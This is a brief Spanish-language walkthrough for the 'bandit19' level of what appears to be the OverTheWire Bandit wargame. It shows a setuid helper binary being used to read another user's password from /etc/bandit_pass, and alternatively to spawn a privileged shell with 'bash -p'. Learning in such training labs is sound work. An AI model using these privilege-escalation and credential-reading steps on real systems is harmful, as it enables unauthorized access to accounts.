# Resolución de bandit19

1. Ingresar a la máquina como el usuario bandit19.

2. Ejecutar el siguiente comando para obtener la contraseña del usuario bandit20. El binario "bandit20-do" permite ejecutar comandos como el usuario bandit20.

`./bandit20-do cat /etc/bandit_pass/bandit20`

3. Alternativamente puede ejecutarse una consola "bash" para escalar privilegios, y obtener la contraseña de la siguiente forma.

```
$ ./bandit20-do bash -p
$ whoami
bandit20
$ cat /etc/bandit_pass/bandit20
```
